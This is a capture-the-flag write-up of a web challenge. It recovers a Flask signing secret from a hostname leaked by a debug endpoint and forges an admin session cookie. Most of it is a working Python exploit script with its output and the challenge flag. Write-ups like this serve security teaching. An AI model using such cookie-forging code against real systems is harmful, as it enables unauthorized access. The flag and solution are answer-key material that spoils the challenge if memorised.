---
title: "SessionForge"
ctf: "CSC-SNIST"
date: 2026-07-10
category: web
difficulty: insane
points: 500
flag_format: "cyberstrike{...}"
author: "retr0"
---

# SessionForge

## Summary

SecureVault is a Flask session-management portal where the signing secret is generated dynamically from the container hostname. The `/debug` endpoint leaks that hostname via a `RuntimeError` traceback, and since `secret_key = md5(hostname)`, the secret is fully recoverable. A known guest session cookie serves as an offline HMAC-SHA1 verification oracle to confirm the recovered key, after which an admin cookie is forged to access `/admin`.

## Solution

### Step 1: Leak the hostname and recover the secret key

The `/debug` route raises `RuntimeError(f"Debug info: host={socket.gethostname()} pid={os.getpid()}")`, and the custom error page prints the full traceback. This discloses the container hostname `c4f33dc31cf2`. The Flask secret key is `md5(hostname)`, which is trivially computable once the hostname is known.

To confirm the recovered key without guessing, log in as `guest`/`guest` (credentials shown on `/login`) to capture a signed session cookie, then verify the key offline against that cookie using `itsdangerous.URLSafeTimedSerializer` (Flask's session signer, salt `cookie-session`, HMAC-SHA1).

### Step 2: Forge an admin session and retrieve the flag

With the verified secret, sign `{"role":"admin","user":"guest"}` and request `/admin` with the forged cookie.

```python
import hashlib, requests, itsdangerous

TARGET = "http://chal.csc-snist.live:51961"

# 1. Leak the hostname from the /debug endpoint's RuntimeError traceback.
import re
debug_html = requests.get(f"{TARGET}/debug", timeout=30).text
m = re.search(r"host=([0-9a-f]+)\b", debug_html)
hostname = m.group(1)  # c4f33dc31cf2
print(f"[+] Leaked hostname: {hostname}")

# 2. Recover the Flask secret key = md5(hostname).
secret_key = hashlib.md5(hostname.encode()).hexdigest()
print(f"[+] Recovered secret key: {secret_key}")

# 3. Verify the key against a known guest session cookie (offline oracle).
s = requests.session()
s.post(f"{TARGET}/login", data={"username": "guest", "password": "guest"},
       timeout=30, allow_redirects=False)
guest_cookie = s.cookies.get("session")
print(f"[+] Guest cookie: {guest_cookie}")

serializer = itsdangerous.URLSafeTimedSerializer(
    secret_key, salt="cookie-session",
    signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1})
print("[+] Key verifies:", serializer.loads(guest_cookie, max_age=None))

# 4. Forge an admin session cookie with the recovered key.
admin_cookie = serializer.dumps({"role": "admin", "user": "guest"})
print(f"[+] Forged admin cookie: {admin_cookie}")

# 5. Access the admin panel with the forged cookie and grab the flag.
r = requests.get(f"{TARGET}/admin", cookies={"session": admin_cookie}, timeout=30)
flag = re.search(r"cyberstrike\{[^}]+\}", r.text).group(0)
print(f"[+] FLAG: {flag}")
```

Actual output:

```
[+] Leaked hostname: c4f33dc31cf2
[+] Recovered secret key: b9f9c8343a8b44564937174b3b1db81d
[+] Guest cookie: eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VyIjoiZ3Vlc3QifQ.alEpdw.0oAoCKfKPtrkFAmSv_AnuB8N3II
[+] Key verifies: {'role': 'guest', 'user': 'guest'}
[+] Forged admin cookie: eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiZ3Vlc3QifQ.alEqQw.aWkcEQDXwqWx6Jdk1oGKlYNtLSY
[+] FLAG: cyberstrike{14e736b1872207cdd55378b4d12bce5c}
```

## Flag

```
cyberstrike{14e736b1872207cdd55378b4d12bce5c}
```
